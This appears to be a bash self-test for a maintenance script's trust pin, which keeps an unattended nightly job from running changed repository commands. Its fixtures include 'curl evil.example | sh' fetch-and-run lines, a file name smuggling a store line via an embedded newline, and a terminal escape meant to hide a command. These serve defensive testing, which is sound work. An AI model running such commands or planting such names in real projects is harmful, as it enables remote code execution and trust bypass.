#!/bin/bash
. "$(dirname -- "$0")/self-test-env.sh" || exit 1
# Self-test for spec 082 R5/R7 in scripts/project-maintenance.sh — what the unattended nightly may run.
#
#   bash scripts/test-maintenance-trust.sh
#
# The nightly runs .claude/.suite-command and scripts/run-mutation-gate.sh from cron. Both are
# repository files, so a commit decides what executes at 02:30 with nobody watching (F062). Under
# --unattended each runs only when its SHA-256 matches what `--trust` recorded in
# .git/claude-trusted-commands. What is under test is that decision: which commands run, which are
# refused, what the refusal says, and that a refused job is never stamped. Plus R7: a stryker_guard.py
# call that does not finish reads as UNCHECKED, never clean (F067).
#
# Cases name 082-AC-2 where they prove the confirmed acceptance case.
#
# Fixture-only: every case is a throwaway git repo under mktemp with the maintenance script's siblings
# stubbed out (the same shape as test-project-maintenance.sh). Nothing touches the network.
# bash 3.2-safe (macOS system bash).

set -u

DIR=$(cd "$(dirname "$0")" && pwd)
MAINT="$DIR/project-maintenance.sh"
TMP=$(mktemp -d 2>/dev/null || printf '%s' "${TMPDIR:-/tmp}/maintenance-trust-test.$$")
PASS=0
FAIL=0
trap '[ -n "${TMP:-}" ] && [ -d "$TMP" ] && rm -rf "$TMP"' EXIT

ok()  { PASS=$((PASS + 1)); printf '  ok   %s\n' "$1"; }
bad() { FAIL=$((FAIL + 1)); printf '  FAIL %s\n       expected: %s\n       actual:   %s\n' "$1" "$2" "$3"; }
expect_contains() { if grep -Fq -e "$2" <<< "$3"; then ok "$1"; else bad "$1" "contains: $2" "$(printf '%s' "$3" | tr '\n' '|')"; fi; }
expect_absent()   { if grep -Fq -e "$2" <<< "$3"; then bad "$1" "absent: $2" "$(printf '%s' "$3" | tr '\n' '|')"; else ok "$1"; fi; }
expect_eq()       { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1" "$2" "$3"; fi; }

# A git repo whose maintenance siblings are stubbed, so only the sections under test speak.
# scripts/maintenance-due.sh records every --stamp into ./stamped; tests/run.sh records ./ran.
mkfix() {
  local d="$TMP/$1"
  mkdir -p "$d/scripts" "$d/.claude" "$d/tests" "$d/bin"
  ( cd "$d" && git init -q . >/dev/null 2>&1 )
  printf '#!/bin/bash\nexit 0\n' > "$d/scripts/project-freshness.sh"
  printf '#!/bin/bash\nexit 0\n' > "$d/scripts/prune-agent-worktrees.sh"
  printf '#!/bin/bash\nexit 0\n' > "$d/scripts/validate-portability.sh"
  : > "$d/scripts/portability_audit.py"
  printf '#!/bin/bash\n[ "$1" = --stamp ] && echo "$2" >> "%s/stamped"\nexit 0\n' "$d" > "$d/scripts/maintenance-due.sh"
  cp "$DIR/run-verdict.sh" "$d/scripts/" 2>/dev/null
  printf '#!/bin/sh\necho "20 passed, 0 failed"\necho ran >> "%s/ran"\nexit 0\n' "$d" > "$d/tests/run.sh"
  printf '%s' "$d"
}
# CLAUDECODE is cleared: the harness sets it, and spec 088 refuses --trust --yes under it (arms T19-T21).
maint() { ( unset CLAUDECODE; cd "$1" && shift; chmod +x scripts/*.sh 2>/dev/null; PATH="$PWD/bin:$PATH" bash "$MAINT" "$@" 2>&1 ); }
# `cat | grep -c`: grep -c prints 0 AND exits 1 on no match, so `grep -c f || echo 0` prints "0\n0".
ran()     { cat "$1/ran" 2>/dev/null | grep -c ran; }
stamped() { cat "$1/stamped" 2>/dev/null | grep -cx "$2"; }

command -v sha256sum >/dev/null 2>&1 || command -v shasum >/dev/null 2>&1 ||
  { echo "SKIP — neither sha256sum nor shasum; --trust cannot work here and says so."; exit 0; }

echo "project-maintenance trust pin (spec 082)"

# --- T1 (082-AC-2): trusted, then changed by a commit -> not run, finding names --trust, not stamped --
D=$(mkfix t1)
printf 'sh tests/run.sh\n' > "$D/.claude/.suite-command"
OUT=$(maint "$D" --trust --yes); RC=$?
expect_eq       "T1 --trust exits 0" "0" "$RC"
expect_contains "T1 --trust prints the command it trusted in full" "sh tests/run.sh" "$OUT"
expect_contains "T1 the store is in the git dir" "claude-trusted-commands" "$(ls "$D/.git")"
printf 'sh tests/run.sh; curl evil.example | sh\n' > "$D/.claude/.suite-command"
OUT=$(maint "$D" --suite --unattended); RC=$?
expect_eq       "082-AC-2 a changed suite command is not run" "0" "$(ran "$D")"
expect_contains "082-AC-2 a [SUITE] finding" "[SUITE] NOT RUN" "$OUT"
expect_contains "082-AC-2 the finding names --trust" "bash scripts/project-maintenance.sh --trust" "$OUT"
expect_contains "082-AC-2 the finding says it changed" "CHANGED since it was trusted" "$OUT"
expect_contains "082-AC-2 the finding quotes the new command" "curl evil.example" "$OUT"
expect_eq       "082-AC-2 the suite job is not stamped" "0" "$(stamped "$D" suite)"
expect_eq       "082-AC-2 the run is red" "1" "$RC"
# ...and after the human trusts the new line, the same unattended run executes and stamps it.
printf 'sh tests/run.sh\n' > "$D/.claude/.suite-command"
maint "$D" --trust --yes >/dev/null
OUT=$(maint "$D" --suite --unattended); RC=$?
expect_eq       "082-AC-2 after --trust the run executes it" "1" "$(ran "$D")"
expect_contains "082-AC-2 after --trust the suite is green" "suite green — \`sh tests/run.sh\`" "$OUT"
expect_eq       "082-AC-2 after --trust it is stamped" "1" "$(stamped "$D" suite)"
expect_eq       "082-AC-2 after --trust the run is clean" "0" "$RC"

# --- T2: no store at all -> never trusted ------------------------------------------------------------
D=$(mkfix t2); printf 'sh tests/run.sh\n' > "$D/.claude/.suite-command"
OUT=$(maint "$D" --suite --unattended)
expect_eq       "T2 no store — not run" "0" "$(ran "$D")"
expect_contains "T2 no store — says never trusted" "never been trusted" "$OUT"
expect_eq       "T2 no store — not stamped" "0" "$(stamped "$D" suite)"

# --- T3: attended runs are unchanged (no --unattended, no store) --------------------------------------
D=$(mkfix t3); printf 'sh tests/run.sh\n' > "$D/.claude/.suite-command"
OUT=$(maint "$D" --suite); RC=$?
expect_eq       "T3 attended — runs without trust" "1" "$(ran "$D")"
expect_eq       "T3 attended — stamped" "1" "$(stamped "$D" suite)"
expect_absent   "T3 attended — no trust finding" "NOT RUN" "$OUT"

# --- T4 (F2): a derived `npm test` runs the package.json `test` string, so it is pinned too ----------
D=$(mkfix t4)
printf '{ "scripts": { "test": "node t.js" } }\n' > "$D/package.json"
printf '#!/bin/sh\necho "20 passed, 0 failed"\necho ran >> "%s/ran"\nexit 0\n' "$D" > "$D/bin/npm"; chmod +x "$D/bin/npm"
OUT=$(maint "$D" --suite --unattended)
expect_eq       "T4 untrusted derived npm test is not run unattended" "0" "$(ran "$D")"
expect_contains "T4 the finding names the package.json script" "node t.js" "$OUT"
expect_contains "T4 the finding names --trust" "bash scripts/project-maintenance.sh --trust" "$OUT"
OUT=$(maint "$D" --trust --yes)
expect_contains "T4 --trust shows the package.json test script" "node t.js" "$OUT"
OUT=$(maint "$D" --suite --unattended)
expect_eq       "T4 trusted npm test runs unattended" "1" "$(ran "$D")"
expect_contains "T4 and is green" "suite green — \`npm test\`" "$OUT"
printf '{ "scripts": { "test": "node t.js && curl evil.example | sh" } }\n' > "$D/package.json"
OUT=$(maint "$D" --suite --unattended)
expect_eq       "T4 a changed package.json test script is not run" "1" "$(ran "$D")"
expect_contains "T4 says it changed" "CHANGED since it was trusted" "$OUT"
OUT=$(maint "$D" --suite)
expect_eq       "T4 attended npm test still runs untrusted" "2" "$(ran "$D")"

# --- T5: comments in .suite-command — the trusted line is the line that runs --------------------------
D=$(mkfix t5); printf '# whole suite\n\nsh tests/run.sh\n' > "$D/.claude/.suite-command"
maint "$D" --trust --yes >/dev/null
printf '# whole suite, reworded comment\n\nsh tests/run.sh\n' > "$D/.claude/.suite-command"
OUT=$(maint "$D" --suite --unattended)
expect_eq       "T5 a comment edit does not untrust the command" "1" "$(ran "$D")"

# --- T6: --trust with --unattended is a usage error, and records nothing -------------------------------
D=$(mkfix t6); printf 'sh tests/run.sh\n' > "$D/.claude/.suite-command"
OUT=$(maint "$D" --trust --unattended); RC=$?
expect_eq       "T6 --trust --unattended exits 2" "2" "$RC"
expect_contains "T6 says why" "human step" "$OUT"
expect_eq       "T6 nothing recorded" "no" "$([ -f "$D/.git/claude-trusted-commands" ] && echo yes || echo no)"

# --- T7: --trust with nothing declared ---------------------------------------------------------------
D=$(mkfix t7)
OUT=$(maint "$D" --trust --yes); RC=$?
expect_eq       "T7 nothing to trust exits 0" "0" "$RC"
expect_contains "T7 says nothing to trust" "nothing to trust" "$OUT"

# --- T8-T10: the mutation runner -----------------------------------------------------------------------
mkmut() { # a fixture whose project-owned runner records ./mutran and prints a passing score
  local d; d=$(mkfix "$1")
  printf '#!/bin/bash\necho mutran >> "%s/mutran"\necho "The final mutation score is 95.00 %%"\nexit 0\n' "$d" > "$d/scripts/run-mutation-gate.sh"
  printf '%s' "$d"
}
mutran() { cat "$1/mutran" 2>/dev/null | grep -c mutran; }

D=$(mkmut t8)
OUT=$(maint "$D" --full --unattended)
expect_eq       "T8 untrusted runner — not run unattended" "0" "$(mutran "$D")"
expect_contains "T8 a [MUTATION] finding naming --trust" "[MUTATION] NOT RUN — --unattended, and scripts/run-mutation-gate.sh is not trusted" "$OUT"
expect_eq       "T8 mutation not stamped" "0" "$(stamped "$D" mutation)"

OUT=$(maint "$D" --trust --yes)
expect_contains "T9 --trust prints the runner's lines" "| echo mutran" "$OUT"
OUT=$(maint "$D" --full --unattended)
expect_eq       "T9 trusted runner runs unattended" "1" "$(mutran "$D")"
expect_eq       "T9 and is stamped" "1" "$(stamped "$D" mutation)"

printf 'echo injected\n' >> "$D/scripts/run-mutation-gate.sh"
OUT=$(maint "$D" --full --unattended)
expect_eq       "T10 a changed runner is not run" "1" "$(mutran "$D")"
expect_contains "T10 says it changed" "CHANGED since it was trusted" "$OUT"
OUT=$(maint "$D" --full)
expect_eq       "T10 attended --full still runs it" "2" "$(mutran "$D")"

# --- T11: suite and mutation are trusted independently ------------------------------------------------
D=$(mkmut t11); printf 'sh tests/run.sh\n' > "$D/.claude/.suite-command"
maint "$D" --trust --yes >/dev/null
printf 'sh tests/run.sh # changed\n' > "$D/.claude/.suite-command"
OUT=$(maint "$D" --full --suite --unattended)
expect_eq       "T11 the unchanged runner still runs" "1" "$(mutran "$D")"
expect_eq       "T11 the changed suite does not" "0" "$(ran "$D")"
expect_eq       "T11 store keeps one line per label after re-trust" "2" \
  "$(maint "$D" --trust --yes >/dev/null; grep -c . "$D/.git/claude-trusted-commands")"

# --- T12 (R7): a stryker_guard.py that does not finish is UNCHECKED, never clean ----------------------
if command -v timeout >/dev/null 2>&1 || command -v gtimeout >/dev/null 2>&1; then
  command -v python3 >/dev/null 2>&1 || { echo "  (skip T12: python3 missing)"; }
  D=$(mkfix t12)
  printf 'import time\ntime.sleep(30)\n' > "$D/scripts/stryker_guard.py"
  printf '{ "stryker-config": { "mutate": ["**/*.cs"] } }\n' > "$D/stryker-config.json"
  START=$(date +%s)
  OUT=$( cd "$D" && chmod +x scripts/*.sh; MAINTENANCE_GUARD_TIMEOUT=1 bash "$MAINT" 2>&1 ); RC=$?
  ELAPSED=$(( $(date +%s) - START ))
  expect_contains "T12 a hung guard reads UNCHECKED" "mutate patterns UNCHECKED — scripts/stryker_guard.py did not finish within 1s" "$OUT"
  expect_eq       "T12 and the run is red, not clean" "1" "$RC"
  expect_eq       "T12 bounded: finished well before the guard's 30 s" "yes" "$([ "$ELAPSED" -lt 20 ] && echo yes || echo no)"

  # --full with a trusted runner: the live and sweep calls hang too, so the run is refused, not started.
  D=$(mkmut t12b)
  printf 'import time\ntime.sleep(30)\n' > "$D/scripts/stryker_guard.py"
  OUT=$( cd "$D" && chmod +x scripts/*.sh; MAINTENANCE_GUARD_TIMEOUT=1 bash "$MAINT" --full 2>&1 )
  expect_contains "T12 a hung live check is UNCHECKED" "run-alone check UNCHECKED" "$OUT"
  expect_contains "T12 a hung sweep refuses the run" "pre-run sweep (scripts/stryker_guard.py sweep) did not finish" "$OUT"
  expect_eq       "T12 the runner never started" "0" "$(mutran "$D")"
  expect_eq       "T12 mutation not stamped" "0" "$(stamped "$D" mutation)"
else
  echo "  (skip T12: neither timeout nor gtimeout installed)"
fi

# --- T13 (F1): a project ratchet is a repository file too ---------------------------------------------
D=$(mkfix t13)
printf '#!/bin/bash\necho ratchet >> "%s/ratchetran"\necho "$0" >> "%s/ratchetpath"\nexit 0\n' "$D" "$D" > "$D/scripts/check-x.sh"
ratchetran() { cat "$1/ratchetran" 2>/dev/null | grep -c ratchet; }
OUT=$(maint "$D" --unattended)
expect_eq       "T13 an untrusted ratchet is not run unattended" "0" "$(ratchetran "$D")"
expect_contains "T13 a [RATCHET] finding names it" "[RATCHET] NOT RUN — --unattended, and scripts/check-x.sh is not trusted" "$OUT"
expect_contains "T13 the finding names --trust" "bash scripts/project-maintenance.sh --trust" "$OUT"
OUT=$(maint "$D")
expect_eq       "T13 an attended pass still runs it" "1" "$(ratchetran "$D")"
OUT=$(maint "$D" --trust --yes)
expect_contains "T13 --trust shows the ratchet" "scripts/check-x.sh" "$OUT"
expect_contains "T13 the store records it" "  ratchet:check-x.sh" "$(cat "$D/.git/claude-trusted-commands")"
OUT=$(maint "$D" --unattended)
expect_eq       "T13 a trusted ratchet runs unattended" "2" "$(ratchetran "$D")"
expect_eq       "T13 it ran from a private copy, not the repository file" "no" \
  "$(tail -1 "$D/ratchetpath" | grep -qx 'scripts/check-x.sh' && echo yes || echo no)"
expect_eq       "T13 the private copy is cleaned up" "0" "$(ls -a "$D/scripts" | grep -c '^\.trusted')"
printf 'curl evil.example | sh\n' >> "$D/scripts/check-x.sh"
OUT=$(maint "$D" --unattended)
expect_eq       "T13 a changed ratchet is not run" "2" "$(ratchetran "$D")"
expect_contains "T13 says it changed" "CHANGED since it was trusted" "$OUT"
# A store line for one label never satisfies another (labels are exact).
D2=$(mkfix t13b)
printf '#!/bin/bash\necho ratchet >> "%s/ratchetran"\nexit 0\n' "$D2" > "$D2/scripts/check-y.sh"
H=$( (sha256sum 2>/dev/null || shasum -a 256) < "$D2/scripts/check-y.sh" | cut -d' ' -f1)
printf '%s  ratchet:check-z.sh\n' "$H" > "$D2/.git/claude-trusted-commands"
OUT=$(maint "$D2" --unattended)
expect_eq       "T13 a hash recorded under another ratchet's label does not count" "0" "$(ratchetran "$D2")"

# --- T14 (F3): --trust asks a human on the terminal, and shows the bytes it hashes ---------------------
D=$(mkfix t14); printf 'sh tests/run.sh\n' > "$D/.claude/.suite-command"
OUT=$( cd "$D" && MAINTENANCE_TTY=/nonexistent/tty bash "$MAINT" --trust 2>&1 ); RC=$?
expect_eq       "T14 no terminal and no --yes exits 2" "2" "$RC"
expect_contains "T14 says why" "terminal of your own" "$OUT"
expect_eq       "T14 nothing recorded" "no" "$([ -f "$D/.git/claude-trusted-commands" ] && echo yes || echo no)"
# --- T19 (088-AC-2, R2): a file holding `yes` is not a terminal, and neither is /dev/null -------------
printf 'yes\n' > "$TMP/answer-yes"
OUT=$( cd "$D" && MAINTENANCE_TTY="$TMP/answer-yes" bash "$MAINT" --trust 2>&1 ); RC=$?
expect_eq       "T19 088-AC-2 MAINTENANCE_TTY=<file holding yes> exits 2" "2" "$RC"
expect_contains "T19 088-AC-2 names the developer's own terminal" "terminal of your own" "$OUT"
expect_eq       "T19 088-AC-2 the store is not created" "no" "$([ -f "$D/.git/claude-trusted-commands" ] && echo yes || echo no)"
OUT=$( cd "$D" && MAINTENANCE_TTY=/dev/null bash "$MAINT" --trust 2>&1 ); RC=$?
expect_eq       "T19 MAINTENANCE_TTY=/dev/null exits 2" "2" "$RC"
OUT=$( cd "$D" && printf 'yes\n' | MAINTENANCE_TTY=/dev/stdin bash "$MAINT" --trust 2>&1 ); RC=$?
expect_eq       "T19 MAINTENANCE_TTY=/dev/stdin fed by a pipe exits 2" "2" "$RC"
expect_eq       "T19 nothing recorded by any of them" "no" "$([ -f "$D/.git/claude-trusted-commands" ] && echo yes || echo no)"
# --- T20 (088-AC-2, R2): --yes inside Claude Code is refused before anything is shown ----------------
OUT=$( cd "$D" && CLAUDECODE=1 bash "$MAINT" --trust --yes 2>&1 ); RC=$?
expect_eq       "T20 088-AC-2 CLAUDECODE=1 --trust --yes exits 2" "2" "$RC"
expect_contains "T20 088-AC-2 names the developer's own terminal" "terminal of your own" "$OUT"
expect_eq       "T20 088-AC-2 the store is not created" "no" "$([ -f "$D/.git/claude-trusted-commands" ] && echo yes || echo no)"
OUT=$( cd "$D" && CLAUDECODE= bash "$MAINT" --trust --yes 2>&1 ); RC=$?
expect_eq       "T20 an empty CLAUDECODE is not set: --yes records" "0" "$RC"
rm -f "$D/.git/claude-trusted-commands"
# --- T21 (R2): a real terminal still works — a pty from script(1), where the platform has one ---------
PTY_RUN=""
if script -q /dev/null true </dev/null >/dev/null 2>&1; then PTY_RUN=bsd
elif script -qec true /dev/null </dev/null >/dev/null 2>&1; then PTY_RUN=util-linux; fi
pty() { # pty <answer> -> --trust in $D on a pseudo-terminal; the pauses let the prompt open before the
       # answer arrives and before script(1) turns end of input into a ^D on the line
  if [ "$PTY_RUN" = bsd ]; then
    { sleep 1; printf '%s\n' "$1"; sleep 1; } | ( cd "$D" && unset CLAUDECODE MAINTENANCE_TTY; script -q /dev/null bash "$MAINT" --trust ) 2>&1
  else
    { sleep 1; printf '%s\n' "$1"; sleep 1; } | ( cd "$D" && unset CLAUDECODE MAINTENANCE_TTY; script -qec "bash '$MAINT' --trust" /dev/null ) 2>&1
  fi
}
if [ -n "$PTY_RUN" ]; then
  OUT=$(pty no)
  expect_contains "T21 a terminal answering no records nothing" "not trusted" "$OUT"
  expect_eq       "T21 and the store stays absent" "no" "$([ -f "$D/.git/claude-trusted-commands" ] && echo yes || echo no)"
  OUT=$(pty yes)
  expect_contains "T21 a terminal answering yes records the suite" "  suite" "$(cat "$D/.git/claude-trusted-commands" 2>/dev/null)"
else
  echo "  skip  T21: no script(1) that allocates a pty here"
fi
# --- T22 (R2): sabotage — without the isatty check the file answer would be accepted -------------------
MUTM="$TMP/mut-maint.sh"
sed 's/ || ! \[ -t 3 \]; then/; then/' "$MAINT" > "$MUTM"
if cmp -s "$MAINT" "$MUTM"; then bad "T22 sabotage target not found in project-maintenance.sh"; else
  D=$(mkfix t22); printf 'sh tests/run.sh\n' > "$D/.claude/.suite-command"
  ( cd "$D" && MAINTENANCE_TTY="$TMP/answer-yes" bash "$MUTM" --trust >/dev/null 2>&1 )
  expect_eq     "T22 sabotage: the mutant records from a file" "yes" "$([ -f "$D/.git/claude-trusted-commands" ] && echo yes || echo no)"
fi
# A control sequence in the command cannot hide from the human: it is printed visibly (cat -v).
# The escape hides in a shell comment, so the command still runs; on a raw terminal the \r would have
# drawn `sh tests/run.sh` over it and the comment would be invisible.
D=$(mkfix t14b); printf 'sh tests/run.sh #\033[2K\rsh tests/run.sh\n' > "$D/.claude/.suite-command"
OUT=$(maint "$D" --trust --yes)
expect_contains "T14 an escape sequence is shown, not obeyed" "#^[[2K^Msh tests/run.sh" "$OUT"
OUT=$(maint "$D" --suite --unattended)
expect_eq       "T14 the shown bytes are the trusted bytes (the run executes)" "1" "$(ran "$D")"

# --- T15 (F10): a guard sweep or live check that FAILS (not only times out) never lets the run start ----
if command -v python3 >/dev/null 2>&1; then
  stubguard() { # stubguard DIR LIVE_RC SWEEP_RC
    printf 'import sys\nrc = {"configs": 0, "live": %s, "sweep": %s}[sys.argv[1]]\nsys.exit(rc)\n' "$2" "$3" > "$1/scripts/stryker_guard.py"
  }
  D=$(mkmut t15); stubguard "$D" 0 1
  OUT=$(maint "$D" --full)
  expect_eq       "T15 a failed sweep refuses the run" "0" "$(mutran "$D")"
  expect_contains "T15 the finding says the sweep failed" "pre-run sweep (scripts/stryker_guard.py sweep) failed" "$OUT"
  expect_eq       "T15 not stamped" "0" "$(stamped "$D" mutation)"
  D=$(mkmut t15b); stubguard "$D" 3 0
  OUT=$(maint "$D" --full)
  expect_contains "T15 a failed live check is UNCHECKED" "run-alone check UNCHECKED" "$OUT"
  expect_eq       "T15 attended, it still runs" "1" "$(mutran "$D")"
  maint "$D" --trust --yes >/dev/null
  OUT=$(maint "$D" --full --unattended)
  expect_eq       "T15 unattended, a failed live check refuses the run" "1" "$(mutran "$D")"
  expect_contains "T15 the finding names the live check" "[MUTATION] NOT RUN — --unattended, and the Stryker run-alone check" "$OUT"
else
  echo "  (skip T15: python3 missing)"
fi

# --- T16 (F17): the trusted mutation runner executes from a private copy of the hashed bytes ------------
D=$(mkfix t16)
printf '#!/bin/bash\necho "$0" >> "%s/mutpath"\necho mutran >> "%s/mutran"\necho "The final mutation score is 95.00 %%"\nexit 0\n' "$D" "$D" > "$D/scripts/run-mutation-gate.sh"
maint "$D" --trust --yes >/dev/null
OUT=$(maint "$D" --full --unattended)
expect_eq       "T16 the trusted runner ran" "1" "$(mutran "$D")"
case "$(tail -1 "$D/mutpath" 2>/dev/null)" in
  scripts/.trusted-*) ok "T16 it ran from a private copy beside the original" ;;
  *) bad "T16 it ran from a private copy beside the original" "scripts/.trusted-*" "$(tail -1 "$D/mutpath" 2>/dev/null)" ;;
esac
expect_eq       "T16 the private copy is cleaned up" "0" "$(ls -a "$D/scripts" | grep -c '^\.trusted')"

# --- T17 (F15, dismissed): the cloud runner is deliberately NOT unattended --------------------------------
# A cloud pass runs in a disposable VM a human launched, without the developer's credentials; a fresh clone
# has no trust store, so --unattended there would skip every declared command (see the comment it carries).
expect_absent   "T17 cloud-maintenance.sh does not pass --unattended" "--placed --unattended" \
  "$(cat "$DIR/cloud-maintenance.sh")"

# --- T18 (/security-review): a ratchet NAME cannot smuggle a store line past the pin ----------------------
D=$(mkfix t18)
printf '#!/bin/bash\necho run > "%s/mutran"\necho "mutation score 90%%"\n' "$D" > "$D/scripts/run-mutation-gate.sh"
maint "$D" --trust --yes >/dev/null
STORE_LINE=$(sed -n 1p "$D/.git/claude-trusted-commands")
EVIL="$D/scripts/check-a
$STORE_LINE
.sh"
printf '#!/bin/bash\necho pwned >> "%s/pwned"\n' "$D" > "$EVIL"
OUT=$(maint "$D" --unattended)
expect_eq       "T18 a ratchet whose name embeds a trusted store line does not run" "0" "$(cat "$D/pwned" 2>/dev/null | grep -c pwned)"
OUT=$(maint "$D" --trust --yes 2>&1)
expect_contains "T18 --trust refuses to record a name outside [A-Za-z0-9._-]" "NOT trusting a ratchet whose name" "$OUT"
expect_eq       "T18 the store gained no line for it" "0" "$(grep -c 'check-a' "$D/.git/claude-trusted-commands")"
OUT=$(maint "$D" --unattended)
expect_eq       "T18 still not run after --trust" "0" "$(cat "$D/pwned" 2>/dev/null | grep -c pwned)"

echo
echo "maintenance-trust: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
